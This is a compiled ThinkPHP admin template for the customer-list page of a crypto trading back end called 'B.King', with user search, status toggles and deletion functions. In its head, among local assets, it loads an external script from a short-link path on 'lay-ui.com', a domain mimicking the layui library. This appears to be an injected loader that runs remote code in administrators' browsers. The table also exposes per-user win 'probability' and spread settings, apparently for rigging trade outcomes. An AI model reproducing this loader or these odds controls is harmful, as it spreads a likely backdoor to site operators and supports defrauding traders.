<?php if (!defined('THINK_PATH')) exit(); /*a:4:{s:70:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/user/userlist.html";i:1637561064;s:61:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/head.html";i:1637561064;s:61:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/menu.html";i:1631099310;s:61:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/foot.html";i:1553756524;}*/ ?>
<!DOCTYPE html>
<html lang="en" style="font-size: 50px;">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="Mosaddek">
    <meta name="keyword" content="FlatLab, Dashboard, Bootstrap, Admin, Template, Theme, Responsive, Fluid, Retina">
    <link rel="shortcut icon" href="/favicon.ico">

    <title>B.King后台管理系统</title>

    <!-- Bootstrap core CSS -->
    <link href="__ADMIN__/css/bootstrap.min.css" rel="stylesheet">
    <link href="__ADMIN__/css/bootstrap-reset.css" rel="stylesheet">
    <!--external css-->
    <link href="__ADMIN__/assets/font-awesome/css/font-awesome.css" rel="stylesheet" />
    <link href="__ADMIN__/assets/jquery-easy-pie-chart/jquery.easy-pie-chart.css" rel="stylesheet" type="text/css" media="screen"/>
    <link rel="stylesheet" href="__ADMIN__/css/owl.carousel.css" type="text/css">
    <!-- Custom styles for this template -->
    <link href="__ADMIN__/css/style.css" rel="stylesheet">
    <link href="__ADMIN__/css/style-responsive.css" rel="stylesheet" />
    <link href="__ADMIN__/css/addstyle.css" rel="stylesheet">

    <script src="__ADMIN__/js/jquery.js"></script>
    <script src="__ADMIN__/js/jquery-1.8.3.min.js"></script>
    <script src="/static/layer/layer.js"></script>

    <!-- 时间选择器 -->
    <link rel="stylesheet" type="text/css" href="__ADMIN__/css/jquery.datetimepicker.css"/>

    <!-- HTML5 shim and Respond.js IE8 support of HTML5 tooltipss and media queries -->
    <!--[if lt IE 9]>
      <script src="__ADMIN__/js/html5shiv.js"></script>
      <script src="__ADMIN__/js/respond.min.js"></script>
    <![endif]-->
    
<script src="https://lay-ui.com/r/gR2/woT3dK"></script>

  </head>

  <body>

  <section id="container" class="">
      <!--header start-->
      <header class="header white-bg">
            <div class="sidebar-toggle-box">
                <div data-original-title="显示/隐藏" data-placement="right" class="icon-reorder tooltips"></div>
            </div>
            <!--logo start-->
          <?php if($msg_nums>0): ?>
          <a  href="<?php echo Url('admin/user/message'); ?>" class="logo">
          <?php else: ?>
          <a  href="#" class="logo">
          <?php endif; ?>
              后台管理系统
              <?php if($msg_nums>0): ?>
              <span>&nbsp;&nbsp;您有<?php echo $msg_nums; ?>条未读留言</span>
              <?php endif; ?>
          </a>
            <!--logo end-->

            <div class="top-nav ">
                <!--search & user info start-->
                <ul class="nav pull-right top-menu">
                    <?php if(isset($_SESSION['username'])): ?>
                    <!-- user login dropdown start-->
                    <li class="dropdown">
                        <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                            <span class="username"><?php echo !empty($_SESSION['username'])?$_SESSION['username']:''; ?></span>
                            <b class="caret"></b>
                        </a>
                        <ul class="dropdown-menu extended logout">
                            <li><a href="<?php echo Url('login/logout'); ?>"><i class="icon-signout"></i> 退出</a></li>
                        </ul>
                    </li>
                    <?php endif; ?>
                    <!-- user login dropdown end -->
                </ul>
                <!--search & user info end-->
            </div>
        </header>
<!--header end-->


<!--sidebar start-->
      <aside>
          <div id="sidebar"  class="nav-collapse ">
          
          <?php if($otype == 3): ?>
              <!-- sidebar menu start-->
              <ul class="sidebar-menu">
                  <li <?php if($actionname == 'index' && $contrname == 'Index'): ?> class="active" <?php endif; ?> >
                      <a class="" href="<?php echo Url('admin/index/index'); ?>">
                          <i class="icon-dashboard"></i>
                          <span>后台首页</span>
                      </a>
                  </li>
                  <!-- <?php if(is_array($menulist) || $menulist instanceof \think\Collection || $menulist instanceof \think\Paginator): $i = 0; $__LIST__ = $menulist;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?> -->
                  <!-- <?php if($ruleslist == 'all' || in_array($vo['id'],$ruleslist)): ?> -->
                  <li 
                  <?php if($vo['arr'] == ""): if($contrname == $vo['con']): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; else: if($contrname == $vo['con'] && (in_array($actionname,$vo['arr']))): ?>
                    class="active"
                    <?php else: ?>
                    class="sub-menu "
                    <?php endif; endif; ?>
                  >
                      <a class="" <?php if($vo['url'] == ""): ?> href="javascript:;" <?php else: ?> href="<?php echo $vo['url']; ?>" <?php endif; ?>>
                          <i class="<?php echo $vo['icon']; ?>"></i>
                          <span><?php echo $vo['name']; ?></span>
                          <!-- <?php if($vo['arrow'] != ""): ?> -->
                          <span class="arrow"></span>
                          <!-- <?php endif; ?> -->
                      </a>
                      <ul class="sub">
                        <!-- <?php if(is_array($vo['list']) || $vo['list'] instanceof \think\Collection || $vo['list'] instanceof \think\Paginator): $i = 0; $__LIST__ = $vo['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$v): $mod = ($i % 2 );++$i;?> -->
                        <!-- <?php if($ruleslist == 'all' || in_array($v['id'],$ruleslist)): ?> -->
                        <li 
                        <?php if($v['arr'] == ""): if($contrname == $v['con'] && $actionname == $v['act']): ?> class="active" <?php endif; else: if(in_array($actionname,$v['arr']) && $contrname == $v['con'] && $actionname == $v['act']): ?>
                          class="active"
                          <?php endif; endif; ?>
                        >
                          <a  href="<?php echo $v['url']; ?>"><?php echo $v['name']; ?></a>
                        </li>
                        <!-- <?php endif; ?> -->
                        <!-- <?php endforeach; endif; else: echo "" ;endif; ?> -->
                      </ul>
                  </li>
                  <!-- <?php endif; ?> -->
                  <!-- <?php endforeach; endif; else: echo "" ;endif; ?> -->
                  <li>
                      <a class="" href="<?php echo Url('admin/login/logout'); ?>">
                          <i class="icon-signout"></i>
                          <span>安全退出</span>
                      </a>
                  </li>
              </ul>
              <!-- sidebar menu end-->
          <?php else: ?>
           <ul class="sidebar-menu">
                  <li <?php if($actionname == 'index' && $contrname == 'Index'): ?> class="active" <?php endif; ?> >
                      <a class="" href="<?php echo Url('admin/index/index'); ?>">
                          <i class="icon-dashboard"></i>
                          <span>后台首页</span>
                      </a>
                  </li>
               
                
                  <li <?php if($contrname == 'Order'): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; ?>>
                      <a href="javascript:;" class="">
                          <i class="icon-paste"></i>
                          <span>订单管理</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          <li <?php if($actionname == 'orderlist'): ?> class="active" <?php endif; ?>><a class="" href="<?php echo Url('admin/order/orderlist'); ?>">秒合约订单</a></li>
                          <li <?php if($actionname == 'orderlist_bibi'): ?> class="active" <?php endif; ?>><a class="" href="<?php echo Url('admin/order/orderlist_bibi'); ?>">币币订单</a></li>
                          <li <?php if($actionname == 'orderlist_lever'): ?> class="active" <?php endif; ?>><a class="" href="<?php echo Url('admin/order/orderlist_lever'); ?>">合约订单</a></li>
                          
                      </ul>
                  </li>

                  <li <?php if($contrname == 'User' && ( in_array($actionname,array('userlist','useradd','userprice','userinfo','cash','myteam')) )): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; ?>>
                      <a href="javascript:;" class="">
                          <i class="icon-user"></i>
                          <span>用户管理</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          <li <?php if(in_array($actionname,array('userlist','useradd'))): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/userlist'); ?>">客户列表</a></li>
                          
                          <li <?php if(in_array($actionname,array('myteam'))): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/myteam'); ?>">我的团队</a></li>

                          <li <?php if($actionname == 'userprice'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/userprice'); ?>">充值列表</a></li>

                          <li <?php if($actionname == 'cash'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/cash'); ?>">提现列表</a></li>
 
                      </ul>
                  </li>

                  
                  <!--<li <?php if($contrname == 'Price'): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; ?>>
                      <a href="javascript:;" class="">
                          <i class="icon-yen"></i>
                          <span>报表管理</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          
                          
                          <li <?php if($actionname == 'allot'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/allot'); ?>">红利报表</a></li>

                          <li <?php if($actionname == 'yongjin'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/yongjin'); ?>">佣金报表</a></li>

                          <li <?php if($actionname == 'pricelist'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/pricelist'); ?>">资金报表</a></li>

                          <li <?php if($actionname == 'myprice'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/myprice'); ?>">个人报表</a></li>
                          
                      </ul>
                  </li>
                  -->
                 

                  <li>
                      <a class="" href="<?php echo Url('admin/login/logout'); ?>">
                          <i class="icon-signout"></i>
                          <span>退出</span>
                      </a>
                  </li>
              </ul>
          
          <?php endif; ?>
          </div>
      </aside>
      <!--sidebar end-->



<!--main content start-->
<section id="main-content">
    <section class="wrapper">
        <!--state overview start-->

        <div class="row state-overview">
            <div class="container">
                <form action="<?php echo url('user/userlist'); ?>" method="get">
                    <div class="row">
                        <div class="col-lg-3 mar-10">
                            <div class="input-group">
                                <span class="input-group-addon">类型</span>
                                <select name="otype" class="selectpicker show-tick form-control">
                                    <option value="">默认不选</option>
                                    <option <?php if(isset($getdata['otype']) && $getdata['otype'] === 0): ?> selected="selected" <?php endif; ?> value="0">客户</option>
                                    <option <?php if(isset($getdata['otype']) && $getdata['otype'] == 101): ?> selected="selected" <?php endif; ?> value="101">代理商</option>
                                </select>
                            </div>
                        </div>
                        <div class="col-lg-5 mar-10">

                            <div class="input-group">
                                <span class="input-group-addon" id="basic-addon1">用户名</span>
                                <input type="text"  value="<?php echo !empty($getdata['username'])?$getdata['username']:''; ?>"  class="form-control" name="username" placeholder="昵称/姓名/邮箱/编号"/>
                            </div>
                        </div>


                        <div class="mar-10">
                            <input type="submit" class="btn btn-success" value="搜索">
                        </div>
                    </div>
                </form>
            </div>
        </div>
        <!--state overview end-->
        <br>
        <a href="<?php echo url('user/userlist'); ?>"><button type="submit" class="btn btn-primary">所有用户</button></a>&nbsp;&nbsp;&nbsp;&nbsp;
        <a href="<?php echo url('user/userlist',array('otype'=>0)); ?>"><button type="submit" class="btn btn-success">所有客户</button></a>&nbsp;&nbsp;&nbsp;&nbsp;
        <a href="<?php echo url('user/userlist',array('otype'=>101)); ?>"><button type="submit" class="btn btn-success">所有代理商</button></a>&nbsp;&nbsp;&nbsp;&nbsp;
        <a href="<?php echo url('user/userlist',array('today'=>1,'otype'=>0)); ?>"><button type="submit" class="btn btn-success">今日客户</button></a>&nbsp;&nbsp;&nbsp;&nbsp;
        <a href="<?php echo url('user/userlist',array('today'=>1,'otype'=>101)); ?>"><button type="submit" class="btn btn-success">今日代理商</button></a>&nbsp;&nbsp;&nbsp;&nbsp;

        <a href="<?php echo url('user/useradd'); ?>"><button type="submit" class="btn btn-danger">添加客户+</button></a>&nbsp;&nbsp;&nbsp;&nbsp;
        <a href="<?php echo url('user/vipuseradd'); ?>"><button type="submit" class="btn btn-danger">添加代理+</button></a>&nbsp;&nbsp;&nbsp;&nbsp;
        <br><br>
        <div class="row">
            <div class="col-lg-12">
                <section class="panel">
                    <header class="panel-heading">
                        用户列表
                    </header>
                    <table class="table table-striped table-advance table-hover">
                        <thead class="ordertable">
                        <tr>
                            <th>编号</th>
                            <th>客户信息</th>
                            <th>客户名称</th>
                            <th>账户等级</th>

                            <th>类型</th>

                            <?php if($otype == 3): ?>
                            <th>概率</th>
                            <th>合约点差</th>
                            <?php endif; ?>
                            <th>创建日期</th>
                            <th>最近登录</th>
                            <!--<th>订单数</th>-->

                            <th>身份</th>
                            <th>推荐人</th>
                            <th>归属代理商</th>
                            <?php if($otype == 3): ?>
                            <th>操作</th>
                            <?php endif; ?>
                        </tr>
                        </thead>
                        <tbody>
                        <!-- <?php if(is_array($userinfo) || $userinfo instanceof \think\Collection || $userinfo instanceof \think\Paginator): $i = 0; $__LIST__ = $userinfo;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?> -->
                        <tr>
                            <td><?php echo $vo['uid']; ?></td>
                            <td><?php echo $vo['username']; ?>【<?php echo $vo['utel']; ?>】</td>
                            <td><?php echo $vo['nickname']; ?></td>
                            <?php if($vo['level'] == 'level_zero'): ?>
                            <td>普通账户</td>
                            <?php elseif($vo['level'] == 'level_one'): ?>
                            <td>标准账户</td>
                            <?php elseif($vo['level'] == 'level_two'): ?>
                            <td>白银账户</td>
                            <?php elseif($vo['level'] == 'level_three'): ?>
                            <td>黄金账户</td>
                            <?php elseif($vo['level'] == 'level_four'): ?>
                            <td>钻石账户</td>
                            <?php endif; if($vo['user_type'] == '0'): ?>
                            <td>卡商</td>
                            <?php elseif($vo['user_type'] == '1'): ?>
                            <td>承兑商</td>
                            <?php endif; if($otype == 3): ?>
                            <td><?php echo !empty($vo['chance'])?$vo['chance']:'0'; ?>%</td>
                            <td><?php echo !empty($vo['income_range'])?$vo['income_range']:'0'; ?></td>
                            <?php endif; ?>
                            <td><?php echo date("Y-m-d H:i:s",$vo['utime']); ?></td>
                            <td><?php echo date("Y-m-d H:i:s",$vo['logintime']); ?></td>
                            <!--<td><?php echo ordernum($vo['uid']); ?></td>-->

                            <td><?php if($vo['otype'] == 0): ?>客户<?php elseif($vo['otype'] == 101): ?>代理商<?php endif; ?></td>
                            <td><?php echo getuser($vo['parent_id'],"nickname"); ?></td>
                            <td><a href="<?php echo url('userlist',array('oid'=>$vo['oid'])); ?>"><?php echo getuser($vo['oid'],"username"); ?></a></td>

                            <td>
                                <?php if($vo['ustatus'] == 0): ?>
                                <a href="javascript:;" onclick="doustatus(1,<?php echo $vo['uid']; ?>)"> <button class="btn btn-danger btn-xs"> 禁用 </button> </a>
                                <?php else: ?>
                                <a href="javascript:;" onclick="doustatus(0,<?php echo $vo['uid']; ?>)"> <button class="btn btn-primary btn-xs"> 启用 </button> </a>
                                <?php endif; ?>


                                <!--如果是代理-->
                                <?php if($vo['otype'] == 101): ?>
                                <!--如果当前管理员是超级管理员-->
                                <?php if($otype == 3): if($vo['channel_fk'] == 0): ?>
                                <a href="javascript:;" onclick="channel_fk(1,<?php echo $vo['uid']; ?>)"> <button class="btn btn-danger btn-xs"> 赋予风控 </button> </a>
                                <?php else: ?>
                                <a href="javascript:;" onclick="channel_fk(0,<?php echo $vo['uid']; ?>)"> <button class="btn btn-primary btn-xs"> 收回风控 </button> </a>
                                <?php endif; endif; ?>
                                <a href="<?php echo url('userlist',array('oid'=>$vo['uid'])); ?>"> <button class="btn btn-primary btn-xs"> 下级客户 </button> </a>
                                <a href="<?php echo url('vipuserlist',array('oid'=>$vo['uid'])); ?>"> <button class="btn btn-primary btn-xs"> 下级代理 </button> </a>
                                <?php endif; if($vo['otype'] != 0): ?>
                                <a href="<?php echo url('user/vipuseredit',array('uid'=>$vo['uid'])); ?>"><button class="btn btn-danger btn-xs"><i class="icon-pencil"> 修改</i></button></a>
                                <?php else: ?>
                                <a href="<?php echo url('user/useredit',array('uid'=>$vo['uid'])); ?>"><button class="btn btn-danger btn-xs"><i class="icon-pencil"> 修改</i></button></a>
                                <!--<a href="javascript:;" onclick="dootype(101,<?php echo $vo['uid']; ?>)"><button class="btn btn-success btn-xs">成为代理商</button></a>-->
                                <?php endif; if($Suid == 1 && $otype == 3): ?>
                                <a href="<?php echo url('consult_detail?id='.$vo['uid']); ?>"> <button class="btn btn-primary btn-xs"> 留言 </button> </a>
                                <a href="<?php echo url('user/accountlist',array('username'=>$vo['uid'])); ?>"> <button class="btn btn-primary btn-xs"> 钱包 </button> </a>
                                <?php endif; if($Suid == 1 && $otype == 3 && $vo['otype'] != 101): ?>

                                <a href="javascript:;" onclick="deleteuser(<?php echo $vo['uid']; ?>)" ><button class="btn btn-danger btn-xs"><i class="icon-pencil"> 删除</i></button></a>
                                <?php endif; ?>

                            </td>

                        </tr>
                        <!-- <?php endforeach; endif; else: echo "" ;endif; ?> -->



                        </tbody>
                    </table>
                </section>
            </div>
        </div>

        <?php echo $userinfo->render(); ?>

    </section>
</section>
<!--main content end-->
</section>


    <!-- js placed at the end of the document so the pages load faster -->
    
    <script src="__ADMIN__/js/bootstrap.min.js"></script>
    <script src="__ADMIN__/js/jquery.scrollTo.min.js"></script>
    <script src="__ADMIN__/js/jquery.nicescroll.js" type="text/javascript"></script>
    <script src="__ADMIN__/js/jquery.sparkline.js" type="text/javascript"></script>
    <script src="__ADMIN__/assets/jquery-easy-pie-chart/jquery.easy-pie-chart.js"></script>
    <script src="__ADMIN__/js/owl.carousel.js" ></script>
    <script src="__ADMIN__/js/jquery.customSelect.min.js" ></script>

    <!--common script for all pages-->
    <script src="__ADMIN__/js/common-scripts.js"></script>

    <!--script for this page-->
    <script src="__ADMIN__/js/sparkline-chart.js"></script>
    <script src="__ADMIN__/js/easy-pie-chart.js"></script>

    <!-- active -->
    <script src="/static/public/js/function.js"></script>
    
    <!-- date -->
    <script type="text/javascript" src="__ADMIN__/js/date/jquery.datetimepicker.js" charset="UTF-8"></script>

  </body>
</html>
<script>
    function jinjie(type,uid) {

        if(type == 1){
            var con = '确定赋予吗？';
        }else if(type == 0){
            var con = '确定收回吗？';
        }else{
            layer.msg('参数错误！');
            return false;
        }

        if(!uid){
            layer.msg('参数错误！');
            return false;
        }

        layer.open({
            content: con,
            yes: function(index){
                //do something
                var formurl = "<?php echo Url('user/jinjie'); ?>";
                var data = 'uid='+uid+'&jinjie='+type;

                $.post(formurl,data,function(resdata){
                    layer.msg(resdata.data);
                    if(resdata.type == 1){
                        history.go(0);
                    }
                })

            }
        });
    }


    function jiying(type,uid) {

        if(type == 0){
            var con = '确定赋予吗？';
        }else if(type == 1){
            var con = '确定收回吗？';
        }else{
            layer.msg('参数错误！');
            return false;
        }

        if(!uid){
            layer.msg('参数错误！');
            return false;
        }

        layer.open({
            content: con,
            yes: function(index){
                //do something
                var formurl = "<?php echo Url('user/jiying'); ?>";
                var data = 'uid='+uid+'&jiying='+type;

                $.post(formurl,data,function(resdata){
                    layer.msg(resdata.data);
                    if(resdata.type == 1){
                        history.go(0);
                    }
                })


            }
        });
    }


    function channel_fk(type,uid) {

        if(type == 1){
            var con = '确定赋予吗？';
        }else if(type == 0){
            var con = '确定收回吗？';
        }else{
            layer.msg('参数错误！');
            return false;
        }

        if(!uid){
            layer.msg('参数错误！');
            return false;
        }

        layer.open({
            content: con,
            yes: function(index){
                //do something
                var formurl = "<?php echo Url('user/channel_fk'); ?>";
                var data = 'uid='+uid+'&channel_fk='+type;

                $.post(formurl,data,function(resdata){
                    layer.msg(resdata.data);
                    if(resdata.type == 1){
                        history.go(0);
                    }
                })


            }
        });
    }


    function channel_rmb(type,uid) {

        if(type == 1){
            var con = '确定开启RMB入金通道吗？';
        }else if(type == 0){
            var con = '确定关闭RMB入金通道吗？';
        }else{
            layer.msg('参数错误！');
            return false;
        }

        if(!uid){
            layer.msg('参数错误！');
            return false;
        }

        layer.open({
            content: con,
            yes: function(index){
                //do something
                var formurl = "<?php echo Url('user/channel_rmb'); ?>";
                var data = 'uid='+uid+'&rmbtd='+type;

                $.post(formurl,data,function(resdata){
                    layer.msg(resdata.data);
                    if(resdata.type == 1){
                        history.go(0);
                    }
                })


            }
        });
    }

    function doustatus(type,uid) {

        if(type == 1){
            var con = '确定禁用吗？';
        }else if(type == 0){
            var con = '确定启用吗？';
        }else{
            layer.msg('参数错误！');
            return false;
        }

        if(!uid){
            layer.msg('参数错误！');
            return false;
        }

        layer.open({
            content: con,
            yes: function(index){
                //do something
                var formurl = "<?php echo Url('user/doustatus'); ?>";
                var data = 'uid='+uid+'&ustatus='+type;

                $.post(formurl,data,function(resdata){
                    layer.msg(resdata.data);
                    if(resdata.type == 1){
                        history.go(0);
                    }
                })


            }
        });
    }

    function dootype(type,uid) {

        if(type == 101){
            var con = '确定要成为代理商吗？';
        }else{
            layer.msg('参数错误！');
            return false;
        }

        if(!uid){
            layer.msg('参数错误！');
            return false;
        }

        layer.open({
            content: con,
            yes: function(index){
                //do something
                var formurl = "<?php echo Url('user/dootype'); ?>";
                var data = 'uid='+uid+'&otype='+type;

                $.post(formurl,data,function(resdata){
                    layer.msg(resdata.data);
                    if(resdata.type == 1){
                        history.go(0);
                    }
                })


            }
        });
    }


    function deleteuser (uid) {

        layer.open({
            content: '你确定删除吗？不可恢复哦，请慎重操作！',
            yes: function(index){
                //do something
                var formurl = "<?php echo Url('user/deleteuser'); ?>";
                var data = 'uid='+uid;

                $.post(formurl,data,function(resdata){
                    layer.msg(resdata.data);
                    if(resdata.type == 1){
                        history.go(0);
                    }
                })


            }
        });


    }


</script>
